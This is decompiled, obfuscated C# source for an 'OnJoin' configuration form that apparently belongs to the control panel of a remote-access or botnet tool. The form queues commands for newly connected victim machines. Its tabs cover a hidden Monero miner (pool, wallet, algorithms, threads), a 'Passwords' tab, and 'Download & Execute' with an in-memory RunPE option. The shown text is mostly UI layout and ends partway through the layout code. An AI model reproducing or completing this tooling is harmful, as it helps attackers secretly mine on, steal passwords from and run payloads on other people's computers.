﻿using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Collections;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Text;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using System.Text.RegularExpressions;
using System.Windows.Forms;
using VisualPlus.Enumerators;
using VisualPlus.Toolkit.Controls.Interactivity;

[DesignerGenerated]
public sealed class fOnJoin : Form
{
    private IContainer icontainer_0;
    private TabPage tabPage_0;
    private TabPage tabPage_1;
    private TabPage tabPage_2;
    private TabControl tabControl_0;
    private GClass7 gclass7_0;
    private Label label_0;
    private TextBox textBox_0;
    private CheckBox checkBox_0;
    private VisualButton visualButton_0;
    private VisualButton visualButton_1;
    private VisualButton visualButton_2;
    private PictureBox pictureBox_0;
    private PictureBox pictureBox_1;
    private CheckBox checkBox_1;
    private TextBox textBox_1;
    private Label label_1;
    private CheckBox checkBox_2;
    private TextBox textBox_2;
    private Label label_2;
    private ComboBox comboBox_0;
    private Label label_3;
    private CheckBox checkBox_3;
    private ComboBox comboBox_1;
    private Label label_4;
    private TextBox textBox_3;
    private Label label_5;
    private CheckBox checkBox_4;
    private ComboBox comboBox_2;
    private Label label_6;
    private ComboBox comboBox_3;
    private Label label_7;
    private TextBox textBox_4;
    private Label label_8;
    private TextBox textBox_5;
    private Label label_9;
    private ContextMenuStrip contextMenuStrip_0;
    private ToolStripMenuItem toolStripMenuItem_0;
    private ToolStripSeparator toolStripSeparator_0;
    private ToolStripMenuItem toolStripMenuItem_1;
    private ToolStripMenuItem toolStripMenuItem_2;
    private ToolStripSeparator toolStripSeparator_1;
    private ToolStripMenuItem toolStripMenuItem_3;
    private TabPage tabPage_3;
    private VisualButton visualButton_3;
    private ToolStripMenuItem toolStripMenuItem_4;
    private TabPage tabPage_4;
    private VisualButton visualButton_4;
    private TabPage tabPage_5;
    private VisualButton visualButton_5;

    public fOnJoin()
    {
        base.Load += new EventHandler(this.fOnJoin_Load);
        base.Closing += new CancelEventHandler(this.fOnJoin_Closing);
        this.InitializeComponent();
    }

    [DebuggerNonUserCode]
    protected override void Dispose(bool disposing)
    {
        if (disposing && (this.icontainer_0 != null))
        {
            this.icontainer_0.Dispose();
        }
    }

    private void fOnJoin_Closing(object sender, CancelEventArgs e)
    {
        base.Visible = false;
        e.Cancel = true;
    }

    private void fOnJoin_Load(object sender, EventArgs e)
    {
        this.vmethod_8().Columns.Add("cmd", "Command");
        this.vmethod_8().Columns[0].Width = 160;
        this.vmethod_8().Columns.Add("params", "Parameters");
        this.vmethod_8().Columns[1].Width = 0x1db;
        this.vmethod_8().Columns.Add("delay", "Delay (min)");
        this.vmethod_8().Columns[2].Width = 120;
        this.vmethod_8().Columns.Add("execs", "Executions");
        this.vmethod_8().Columns[3].Width = 100;
        this.vmethod_8().GridLines = Class135.smethod_0().Gridlines;
        this.vmethod_58().Items.Add("cn/r");
        this.vmethod_58().Items.Add("rx/0");
        this.vmethod_58().Items.Add("argon2/chukwa");
        this.vmethod_58().Items.Add("argon2/wrkz");
        this.vmethod_58().Items.Add("rx/wow");
        this.vmethod_58().Items.Add("rx/loki");
        this.vmethod_58().Items.Add("cn/fast");
        this.vmethod_58().Items.Add("cn/rwz");
        this.vmethod_58().Items.Add("cn/zls");
        this.vmethod_58().Items.Add("cn/double");
        this.vmethod_58().Items.Add("cn/wow");
        this.vmethod_58().Items.Add("cn/gpu");
        this.vmethod_58().Items.Add("cn-pico");
        this.vmethod_58().Items.Add("cn/half");
        this.vmethod_58().Items.Add("cn/2");
        this.vmethod_58().Items.Add("cn/xao");
        this.vmethod_58().Items.Add("cn/rto");
        this.vmethod_58().Items.Add("cn-heavy/tube");
        this.vmethod_58().Items.Add("cn-heavy/xhv");
        this.vmethod_58().Items.Add("cn-heavy/0");
        this.vmethod_58().Items.Add("cn/1");
        this.vmethod_58().Items.Add("cn-lite/1");
        this.vmethod_58().Items.Add("cn-lite/0");
        this.vmethod_58().Items.Add("cn/0");
        this.vmethod_58().SelectedItem = this.vmethod_58().Items[0];
        this.vmethod_54().Items.Add("Auto");
        int num = 1;
        while (true)
        {
            this.vmethod_54().Items.Add(num);
            num++;
            if (num > 0x80)
            {
                this.vmethod_54().SelectedItem = this.vmethod_54().Items[0];
                this.vmethod_44().Items.Add("Default");
                int num2 = 1;
                while (true)
                {
                    this.vmethod_44().Items.Add(num2);
                    num2++;
                    if (num2 > 0x63)
                    {
                        this.vmethod_44().SelectedItem = this.vmethod_44().Items[0];
                        this.vmethod_38().Items.Add("Realtime");
                        this.vmethod_38().Items.Add("High");
                        this.vmethod_38().Items.Add("Above normal");
                        this.vmethod_38().Items.Add("Normal");
                        this.vmethod_38().Items.Add("Below normal");
                        this.vmethod_38().Items.Add("Low");
                        this.vmethod_38().SelectedItem = this.vmethod_38().Items[3];
                        if (Class135.smethod_0().OnJoinCommands != null)
                        {
                            IEnumerator enumerator = Class135.smethod_0().OnJoinCommands.GetEnumerator();
                            while (enumerator.MoveNext())
                            {
                                string[] strArray = Strings.Split(Conversions.ToString(enumerator.Current), "|", 4, CompareMethod.Text);
                                ListViewItem item = new ListViewItem();
                                item.Text = strArray[0];
                                item.SubItems.Add(strArray[1]);
                                item.SubItems.Add(strArray[2]);
                                item.SubItems.Add("0");
                                item.Tag = strArray[3];
                                this.vmethod_8().Items.Add(item);
                            }
                        }
                        return;
                    }
                }
            }
        }
    }

    [DebuggerStepThrough]
    private void InitializeComponent()
    {
        this.icontainer_0 = new Container();
        this.vmethod_1(new TabPage());
        this.vmethod_23(new PictureBox());
        this.vmethod_25(new PictureBox());
        this.vmethod_27(new CheckBox());
        this.vmethod_29(new TextBox());
        this.vmethod_31(new Label());
        this.vmethod_33(new CheckBox());
        this.vmethod_35(new TextBox());
        this.vmethod_37(new Label());
        this.vmethod_39(new ComboBox());
        this.vmethod_41(new Label());
        this.vmethod_43(new CheckBox());
        this.vmethod_45(new ComboBox());
        this.vmethod_47(new Label());
        this.vmethod_49(new TextBox());
        this.vmethod_51(new Label());
        this.vmethod_53(new CheckBox());
        this.vmethod_55(new ComboBox());
        this.vmethod_57(new Label());
        this.vmethod_59(new ComboBox());
        this.vmethod_61(new Label());
        this.vmethod_63(new TextBox());
        this.vmethod_65(new Label());
        this.vmethod_67(new TextBox());
        this.vmethod_69(new Label());
        this.vmethod_21(new VisualButton());
        this.vmethod_3(new TabPage());
        this.vmethod_19(new VisualButton());
        this.vmethod_5(new TabPage());
        this.vmethod_17(new VisualButton());
        this.vmethod_15(new CheckBox());
        this.vmethod_11(new Label());
        this.vmethod_13(new TextBox());
        this.vmethod_7(new TabControl());
        this.vmethod_85(new TabPage());
        this.vmethod_87(new VisualButton());
        this.vmethod_91(new TabPage());
        this.vmethod_93(new VisualButton());
        this.vmethod_95(new TabPage());
        this.vmethod_97(new VisualButton());
        this.vmethod_71(new ContextMenuStrip(this.icontainer_0));
        this.vmethod_73(new ToolStripMenuItem());
        this.vmethod_89(new ToolStripMenuItem());
        this.vmethod_75(new ToolStripSeparator());
        this.vmethod_77(new ToolStripMenuItem());
        this.vmethod_79(new ToolStripMenuItem());
        this.vmethod_81(new ToolStripSeparator());
        this.vmethod_83(new ToolStripMenuItem());
        this.vmethod_9(new GClass7());
        this.vmethod_0().SuspendLayout();
        ((ISupportInitialize) this.vmethod_22()).BeginInit();
        ((ISupportInitialize) this.vmethod_24()).BeginInit();
        this.vmethod_2().SuspendLayout();
        this.vmethod_4().SuspendLayout();
        this.vmethod_6().SuspendLayout();
        this.vmethod_84().SuspendLayout();
        this.vmethod_90().SuspendLayout();
        this.vmethod_94().SuspendLayout();
        this.vmethod_70().SuspendLayout();
        base.SuspendLayout();
        this.vmethod_0().BackColor = SystemColors.AppWorkspace;
        this.vmethod_0().Controls.Add(this.vmethod_22());
        this.vmethod_0().Controls.Add(this.vmethod_24());
        this.vmethod_0().Controls.Add(this.vmethod_26());
        this.vmethod_0().Controls.Add(this.vmethod_28());
        this.vmethod_0().Controls.Add(this.vmethod_30());
        this.vmethod_0().Controls.Add(this.vmethod_32());
        this.vmethod_0().Controls.Add(this.vmethod_34());
        this.vmethod_0().Controls.Add(this.vmethod_36());
        this.vmethod_0().Controls.Add(this.vmethod_38());
        this.vmethod_0().Controls.Add(this.vmethod_40());
        this.vmethod_0().Controls.Add(this.vmethod_42());
        this.vmethod_0().Controls.Add(this.vmethod_44());
        this.vmethod_0().Controls.Add(this.vmethod_46());
        this.vmethod_0().Controls.Add(this.vmethod_48());
        this.vmethod_0().Controls.Add(this.vmethod_50());
        this.vmethod_0().Controls.Add(this.vmethod_52());
        this.vmethod_0().Controls.Add(this.vmethod_54());
        this.vmethod_0().Controls.Add(this.vmethod_56());
        this.vmethod_0().Controls.Add(this.vmethod_58());
        this.vmethod_0().Controls.Add(this.vmethod_60());
        this.vmethod_0().Controls.Add(this.vmethod_62());
        this.vmethod_0().Controls.Add(this.vmethod_64());
        this.vmethod_0().Controls.Add(this.vmethod_66());
        this.vmethod_0().Controls.Add(this.vmethod_68());
        this.vmethod_0().Controls.Add(this.vmethod_20());
        this.vmethod_0().Location = new Point(4, 0x16);
        this.vmethod_0().Margin = new Padding(2);
        this.vmethod_0().Name = "tbXMR";
        this.vmethod_0().Padding = new Padding(2);
        this.vmethod_0().Size = new Size(0x36f, 90);
        this.vmethod_0().TabIndex = 2;
        this.vmethod_0().Text = "XMR Miner";
        this.vmethod_22().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_22().Image = Class131.smethod_24();
        this.vmethod_22().Location = new Point(0x194, 30);
        this.vmethod_22().Margin = new Padding(2);
        this.vmethod_22().Name = "pbXMRThreads";
        this.vmethod_22().Size = new Size(15, 15);
        this.vmethod_22().SizeMode = PictureBoxSizeMode.StretchImage;
        this.vmethod_22().TabIndex = 120;
        this.vmethod_22().TabStop = false;
        this.vmethod_24().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_24().Image = Class131.smethod_24();
        this.vmethod_24().Location = new Point(0x322, 0x31);
        this.vmethod_24().Margin = new Padding(2);
        this.vmethod_24().Name = "chkMiner64";
        this.vmethod_24().Size = new Size(15, 15);
        this.vmethod_24().SizeMode = PictureBoxSizeMode.StretchImage;
        this.vmethod_24().TabIndex = 0x77;
        this.vmethod_24().TabStop = false;
        this.vmethod_26().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_26().AutoSize = true;
        this.vmethod_26().BackColor = Color.Transparent;
        this.vmethod_26().Location = new Point(0x2ea, 50);
        this.vmethod_26().Margin = new Padding(2);
        this.vmethod_26().Name = "chk64bit";
        this.vmethod_26().Size = new Size(0x34, 0x11);
        this.vmethod_26().TabIndex = 0x76;
        this.vmethod_26().TabStop = false;
        this.vmethod_26().Text = "64-bit";
        this.vmethod_26().UseVisualStyleBackColor = false;
        this.vmethod_28().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_28().Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Italic, GraphicsUnit.Point, 0);
        this.vmethod_28().ForeColor = Color.Gray;
        this.vmethod_28().Location = new Point(650, 8);
        this.vmethod_28().Margin = new Padding(2);
        this.vmethod_28().Name = "txtRigID";
        this.vmethod_28().Size = new Size(0xc5, 20);
        this.vmethod_28().TabIndex = 0x75;
        this.vmethod_28().Text = "(Optional)";
        this.vmethod_30().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_30().BackColor = Color.Transparent;
        this.vmethod_30().Location = new Point(0x25f, 10);
        this.vmethod_30().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_30().Name = "lblRigID";
        this.vmethod_30().Size = new Size(0x27, 13);
        this.vmethod_30().TabIndex = 0x74;
        this.vmethod_30().Text = "Rig ID:";
        this.vmethod_30().TextAlign = ContentAlignment.TopRight;
        this.vmethod_32().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_32().AutoSize = true;
        this.vmethod_32().BackColor = Color.Transparent;
        this.vmethod_32().Location = new Point(0x23c, 50);
        this.vmethod_32().Margin = new Padding(2);
        this.vmethod_32().Name = "chkHugePages";
        this.vmethod_32().Size = new Size(0x63, 0x11);
        this.vmethod_32().TabIndex = 0x73;
        this.vmethod_32().TabStop = false;
        this.vmethod_32().Text = "No huge pages";
        this.vmethod_32().UseVisualStyleBackColor = false;
        this.vmethod_34().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_34().Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Italic, GraphicsUnit.Point, 0);
        this.vmethod_34().ForeColor = Color.Gray;
        this.vmethod_34().Location = new Point(0x1f3, 0x1c);
        this.vmethod_34().Margin = new Padding(2);
        this.vmethod_34().Name = "txtUserAgent";
        this.vmethod_34().Size = new Size(0x15c, 20);
        this.vmethod_34().TabIndex = 0x72;
        this.vmethod_34().Text = "(Optional)";
        this.vmethod_36().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_36().BackColor = Color.Transparent;
        this.vmethod_36().Location = new Point(0x1ad, 0x1f);
        this.vmethod_36().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_36().Name = "lblUserAgent";
        this.vmethod_36().Size = new Size(0x43, 13);
        this.vmethod_36().TabIndex = 0x71;
        this.vmethod_36().Text = "User-Agent:";
        this.vmethod_36().TextAlign = ContentAlignment.TopRight;
        this.vmethod_38().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_38().BackColor = Color.White;
        this.vmethod_38().DropDownStyle = ComboBoxStyle.DropDownList;
        this.vmethod_38().ForeColor = Color.Black;
        this.vmethod_38().FormattingEnabled = true;
        this.vmethod_38().ImeMode = ImeMode.NoControl;
        this.vmethod_38().Location = new Point(0x1f3, 5);
        this.vmethod_38().Margin = new Padding(2);
        this.vmethod_38().Name = "cbProcessPriority";
        this.vmethod_38().Size = new Size(0x5d, 0x15);
        this.vmethod_38().TabIndex = 0x70;
        this.vmethod_38().TabStop = false;
        this.vmethod_40().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_40().BackColor = Color.Transparent;
        this.vmethod_40().Location = new Point(0x193, 7);
        this.vmethod_40().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_40().Name = "lblProcessPriority";
        this.vmethod_40().Size = new Size(0x5d, 13);
        this.vmethod_40().TabIndex = 0x6f;
        this.vmethod_40().Text = "Process priority:";
        this.vmethod_40().TextAlign = ContentAlignment.TopRight;
        this.vmethod_42().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_42().AutoSize = true;
        this.vmethod_42().BackColor = Color.Transparent;
        this.vmethod_42().Checked = true;
        this.vmethod_42().CheckState = CheckState.Checked;
        this.vmethod_42().Location = new Point(0x1f3, 50);
        this.vmethod_42().Margin = new Padding(2);
        this.vmethod_42().Name = "chkKeepalive";
        this.vmethod_42().Size = new Size(0x49, 0x11);
        this.vmethod_42().TabIndex = 110;
        this.vmethod_42().TabStop = false;
        this.vmethod_42().Text = "Keepalive";
        this.vmethod_42().UseVisualStyleBackColor = false;
        this.vmethod_44().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_44().BackColor = Color.White;
        this.vmethod_44().DropDownStyle = ComboBoxStyle.DropDownList;
        this.vmethod_44().ForeColor = Color.Black;
        this.vmethod_44().FormattingEnabled = true;
        this.vmethod_44().ImeMode = ImeMode.NoControl;
        this.vmethod_44().Location = new Point(0x143, 0x31);
        this.vmethod_44().Margin = new Padding(2);
        this.vmethod_44().Name = "cbDonate";
        this.vmethod_44().Size = new Size(0x4d, 0x15);
        this.vmethod_44().TabIndex = 0x6d;
        this.vmethod_44().TabStop = false;
        this.vmethod_46().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_46().BackColor = Color.Transparent;
        this.vmethod_46().Location = new Point(270, 0x33);
        this.vmethod_46().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_46().Name = "lblDonate";
        this.vmethod_46().Size = new Size(0x31, 13);
        this.vmethod_46().TabIndex = 0x6c;
        this.vmethod_46().Text = "Donate:";
        this.vmethod_46().TextAlign = ContentAlignment.TopRight;
        this.vmethod_48().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_48().Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Italic, GraphicsUnit.Point, 0);
        this.vmethod_48().ForeColor = Color.Gray;
        this.vmethod_48().Location = new Point(0x43, 0x31);
        this.vmethod_48().Margin = new Padding(2);
        this.vmethod_48().Name = "txtPassword";
        this.vmethod_48().Size = new Size(0xbf, 20);
        this.vmethod_48().TabIndex = 0x6b;
        this.vmethod_48().Text = "(Optional)";
        this.vmethod_50().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_50().BackColor = Color.Transparent;
        this.vmethod_50().Location = new Point(6, 0x33);
        this.vmethod_50().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_50().Name = "lblPassword";
        this.vmethod_50().Size = new Size(0x39, 13);
        this.vmethod_50().TabIndex = 0x6a;
        this.vmethod_50().Text = "Password:";
        this.vmethod_50().TextAlign = ContentAlignment.TopRight;
        this.vmethod_52().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_52().AutoSize = true;
        this.vmethod_52().BackColor = Color.Transparent;
        this.vmethod_52().Location = new Point(0x29f, 50);
        this.vmethod_52().Margin = new Padding(2);
        this.vmethod_52().Name = "chkNicehash";
        this.vmethod_52().Size = new Size(0x47, 0x11);
        this.vmethod_52().TabIndex = 0x69;
        this.vmethod_52().TabStop = false;
        this.vmethod_52().Text = "Nicehash";
        this.vmethod_52().UseVisualStyleBackColor = false;
        this.vmethod_54().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_54().BackColor = Color.White;
        this.vmethod_54().DropDownStyle = ComboBoxStyle.DropDownList;
        this.vmethod_54().ForeColor = Color.Black;
        this.vmethod_54().FormattingEnabled = true;
        this.vmethod_54().ImeMode = ImeMode.NoControl;
        this.vmethod_54().Location = new Point(0x143, 0x1b);
        this.vmethod_54().Margin = new Padding(2);
        this.vmethod_54().Name = "cbThreads";
        this.vmethod_54().Size = new Size(0x4d, 0x15);
        this.vmethod_54().TabIndex = 0x68;
        this.vmethod_54().TabStop = false;
        this.vmethod_56().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_56().BackColor = Color.Transparent;
        this.vmethod_56().Location = new Point(270, 0x1d);
        this.vmethod_56().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_56().Name = "lblThreads";
        this.vmethod_56().Size = new Size(0x31, 13);
        this.vmethod_56().TabIndex = 0x67;
        this.vmethod_56().Text = "Threads:";
        this.vmethod_56().TextAlign = ContentAlignment.TopRight;
        this.vmethod_58().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_58().BackColor = Color.White;
        this.vmethod_58().DropDownStyle = ComboBoxStyle.DropDownList;
        this.vmethod_58().ForeColor = Color.Black;
        this.vmethod_58().FormattingEnabled = true;
        this.vmethod_58().ImeMode = ImeMode.NoControl;
        this.vmethod_58().Location = new Point(0x143, 5);
        this.vmethod_58().Margin = new Padding(2);
        this.vmethod_58().Name = "cbAlgo";
        this.vmethod_58().Size = new Size(0x4d, 0x15);
        this.vmethod_58().TabIndex = 0x66;
        this.vmethod_58().TabStop = false;
        this.vmethod_60().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_60().BackColor = Color.Transparent;
        this.vmethod_60().Location = new Point(0x103, 7);
        this.vmethod_60().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_60().Name = "lblAlgo";
        this.vmethod_60().Size = new Size(60, 13);
        this.vmethod_60().TabIndex = 0x65;
        this.vmethod_60().Text = "Algorithm:";
        this.vmethod_60().TextAlign = ContentAlignment.TopRight;
        this.vmethod_62().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_62().Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Italic, GraphicsUnit.Point, 0);
        this.vmethod_62().ForeColor = Color.Gray;
        this.vmethod_62().Location = new Point(0x43, 0x1c);
        this.vmethod_62().Margin = new Padding(2);
        this.vmethod_62().Name = "txtUsername";
        this.vmethod_62().Size = new Size(0xbf, 20);
        this.vmethod_62().TabIndex = 100;
        this.vmethod_62().Text = "Username/wallet address";
        this.vmethod_64().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_64().BackColor = Color.Transparent;
        this.vmethod_64().Location = new Point(3, 30);
        this.vmethod_64().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_64().Name = "lblUsername";
        this.vmethod_64().Size = new Size(60, 13);
        this.vmethod_64().TabIndex = 0x63;
        this.vmethod_64().Text = "Username:";
        this.vmethod_64().TextAlign = ContentAlignment.TopRight;
        this.vmethod_66().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_66().Font = new Font("Microsoft Sans Serif", 8f, FontStyle.Italic, GraphicsUnit.Point, 0);
        this.vmethod_66().ForeColor = Color.Gray;
        this.vmethod_66().Location = new Point(0x43, 8);
        this.vmethod_66().Margin = new Padding(2);
        this.vmethod_66().Name = "txtPool";
        this.vmethod_66().Size = new Size(0xbf, 20);
        this.vmethod_66().TabIndex = 0x62;
        this.vmethod_66().Text = "example-pool.com:5555";
        this.vmethod_68().Anchor = AnchorStyles.Left | AnchorStyles.Bottom;
        this.vmethod_68().BackColor = Color.Transparent;
        this.vmethod_68().Location = new Point(6, 10);
        this.vmethod_68().Margin = new Padding(2, 0, 2, 0);
        this.vmethod_68().Name = "lblPool";
        this.vmethod_68().Size = new Size(0x39, 13);
        this.vmethod_68().TabIndex = 0x61;
        this.vmethod_68().Text = "Pool:";
        this.vmethod_68().TextAlign = ContentAlignment.TopRight;
        this.vmethod_20().Anchor = AnchorStyles.Right | AnchorStyles.Bottom;
        this.vmethod_20().BackColorState.Disabled = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_20().BackColorState.Enabled = Color.FromArgb(220, 220, 220);
        this.vmethod_20().BackColorState.Hover = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_20().BackColorState.Pressed = Color.FromArgb(0xc0, 0xc0, 0xc0);
        this.vmethod_20().Border.Color = Color.FromArgb(180, 180, 180);
        this.vmethod_20().Border.HoverColor = Color.FromArgb(120, 0xb7, 230);
        this.vmethod_20().Border.HoverVisible = true;
        this.vmethod_20().Border.Rounding = 6;
        this.vmethod_20().Border.Thickness = 1;
        this.vmethod_20().Border.Type = ShapeTypes.Rounded;
        this.vmethod_20().Border.Visible = true;
        this.vmethod_20().DialogResult = DialogResult.None;
        this.vmethod_20().ForeColor = Color.FromArgb(0, 0, 0);
        this.vmethod_20().Image = null;
        this.vmethod_20().Location = new Point(0x328, 0x44);
        this.vmethod_20().MouseState = MouseStates.Normal;
        this.vmethod_20().Name = "btnXMRAdd";
        this.vmethod_20().Size = new Size(0x44, 0x13);
        this.vmethod_20().TabIndex = 0x2f;
        this.vmethod_20().Text = "Add";
        this.vmethod_20().TextImageRelation = TextImageRelation.Overlay;
        this.vmethod_20().TextStyle.Disabled = Color.FromArgb(0x83, 0x81, 0x81);
        this.vmethod_20().TextStyle.Enabled = Color.FromArgb(0, 0, 0);
        this.vmethod_20().TextStyle.Hover = Color.FromArgb(0, 0, 0);
        this.vmethod_20().TextStyle.Pressed = Color.FromArgb(0, 0, 0);
        this.vmethod_20().TextStyle.TextAlignment = StringAlignment.Center;
        this.vmethod_20().TextStyle.TextLineAlignment = StringAlignment.Center;
        this.vmethod_20().TextStyle.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
        this.vmethod_2().BackColor = SystemColors.AppWorkspace;
        this.vmethod_2().Controls.Add(this.vmethod_18());
        this.vmethod_2().Location = new Point(4, 0x16);
        this.vmethod_2().Margin = new Padding(2);
        this.vmethod_2().Name = "tbPasswords";
        this.vmethod_2().Padding = new Padding(2);
        this.vmethod_2().Size = new Size(0x36f, 90);
        this.vmethod_2().TabIndex = 3;
        this.vmethod_2().Text = "Passwords";
        this.vmethod_18().Anchor = AnchorStyles.Right | AnchorStyles.Bottom;
        this.vmethod_18().BackColorState.Disabled = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_18().BackColorState.Enabled = Color.FromArgb(220, 220, 220);
        this.vmethod_18().BackColorState.Hover = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_18().BackColorState.Pressed = Color.FromArgb(0xc0, 0xc0, 0xc0);
        this.vmethod_18().Border.Color = Color.FromArgb(180, 180, 180);
        this.vmethod_18().Border.HoverColor = Color.FromArgb(120, 0xb7, 230);
        this.vmethod_18().Border.HoverVisible = true;
        this.vmethod_18().Border.Rounding = 6;
        this.vmethod_18().Border.Thickness = 1;
        this.vmethod_18().Border.Type = ShapeTypes.Rounded;
        this.vmethod_18().Border.Visible = true;
        this.vmethod_18().DialogResult = DialogResult.None;
        this.vmethod_18().ForeColor = Color.FromArgb(0, 0, 0);
        this.vmethod_18().Image = null;
        this.vmethod_18().Location = new Point(0x328, 0x44);
        this.vmethod_18().MouseState = MouseStates.Normal;
        this.vmethod_18().Name = "btnPwsAdd";
        this.vmethod_18().Size = new Size(0x44, 0x13);
        this.vmethod_18().TabIndex = 0x2e;
        this.vmethod_18().Text = "Add";
        this.vmethod_18().TextImageRelation = TextImageRelation.Overlay;
        this.vmethod_18().TextStyle.Disabled = Color.FromArgb(0x83, 0x81, 0x81);
        this.vmethod_18().TextStyle.Enabled = Color.FromArgb(0, 0, 0);
        this.vmethod_18().TextStyle.Hover = Color.FromArgb(0, 0, 0);
        this.vmethod_18().TextStyle.Pressed = Color.FromArgb(0, 0, 0);
        this.vmethod_18().TextStyle.TextAlignment = StringAlignment.Center;
        this.vmethod_18().TextStyle.TextLineAlignment = StringAlignment.Center;
        this.vmethod_18().TextStyle.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
        this.vmethod_4().BackColor = SystemColors.AppWorkspace;
        this.vmethod_4().Controls.Add(this.vmethod_16());
        this.vmethod_4().Controls.Add(this.vmethod_14());
        this.vmethod_4().Controls.Add(this.vmethod_10());
        this.vmethod_4().Controls.Add(this.vmethod_12());
        this.vmethod_4().Location = new Point(4, 0x16);
        this.vmethod_4().Margin = new Padding(2);
        this.vmethod_4().Name = "tbDLEXEC";
        this.vmethod_4().Padding = new Padding(2);
        this.vmethod_4().Size = new Size(0x36f, 90);
        this.vmethod_4().TabIndex = 0;
        this.vmethod_4().Text = "Download & Execute";
        this.vmethod_16().Anchor = AnchorStyles.Right | AnchorStyles.Bottom;
        this.vmethod_16().BackColorState.Disabled = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_16().BackColorState.Enabled = Color.FromArgb(220, 220, 220);
        this.vmethod_16().BackColorState.Hover = Color.FromArgb(0xe0, 0xe0, 0xe0);
        this.vmethod_16().BackColorState.Pressed = Color.FromArgb(0xc0, 0xc0, 0xc0);
        this.vmethod_16().Border.Color = Color.FromArgb(180, 180, 180);
        this.vmethod_16().Border.HoverColor = Color.FromArgb(120, 0xb7, 230);
        this.vmethod_16().Border.HoverVisible = true;
        this.vmethod_16().Border.Rounding = 6;
        this.vmethod_16().Border.Thickness = 1;
        this.vmethod_16().Border.Type = ShapeTypes.Rounded;
        this.vmethod_16().Border.Visible = true;
        this.vmethod_16().DialogResult = DialogResult.None;
        this.vmethod_16().ForeColor = Color.FromArgb(0, 0, 0);
        this.vmethod_16().Image = null;
        this.vmethod_16().Location = new Point(0x328, 0x44);
        this.vmethod_16().MouseState = MouseStates.Normal;
        this.vmethod_16().Name = "btnDLEXECAdd";
        this.vmethod_16().Size = new Size(0x44, 0x13);
        this.vmethod_16().TabIndex = 0x2d;
        this.vmethod_16().Text = "Add";
        this.vmethod_16().TextImageRelation = TextImageRelation.Overlay;
        this.vmethod_16().TextStyle.Disabled = Color.FromArgb(0x83, 0x81, 0x81);
        this.vmethod_16().TextStyle.Enabled = Color.FromArgb(0, 0, 0);
        this.vmethod_16().TextStyle.Hover = Color.FromArgb(0, 0, 0);
        this.vmethod_16().TextStyle.Pressed = Color.FromArgb(0, 0, 0);
        this.vmethod_16().TextStyle.TextAlignment = StringAlignment.Center;
        this.vmethod_16().TextStyle.TextLineAlignment = StringAlignment.Center;
        this.vmethod_16().TextStyle.TextRenderingHint = TextRenderingHint.ClearTypeGridFit;
        this.vmethod_14().AutoSize = true;
        this.vmethod_14().BackColor = Color.Transparent;
        this.vmethod_14().Checked = true;
        this.vmethod_14().CheckState = CheckState.Checked;
        this.vmethod_14().Location = new Point(8, 0x35);
        this.vmethod_14().Margin = new Padding(1);
        this.vmethod_14().Name = "chkDLEXECMem";
        this.vmethod_14().RightToLeft = RightToLeft.Yes;
        this.vmethod_14().Size = new Size(0x9e, 0x11);
        this.vmethod_14().TabIndex = 0x1f;
        this.vmethod_14().Text = "Execute in memory (RunPE)";
        this.vmethod_14().UseVisualStyleBackColor = false;
        this.vmethod_10().AutoSize = true;
        this.vmethod_10().BackColor = Color.Transparent;
        this.vmethod_10().FlatStyle = FlatStyle.Flat;
        this.vmethod_10().Location = new Point(5, 0x13);
        this.vmethod_10().Margin = new Padding(1, 0, 1, 0);
        this.vmethod_10().Name = "lblNetworkBandwidth";
        this.vmethod_10().Size = new Size(0x39, 13);
        this.vmethod_10().TabIndex = 30;
        this.vmethod_10().Text = "Target file:";
        this.vmethod_10().TextAlign = ContentAlignment.MiddleLeft;
        this.vmethod_12().Location = new Point(0x40, 0x10);
        this.vmethod_12().Margin = new Padding(1);
        this.vmethod_12().MaxLength = 0x800;
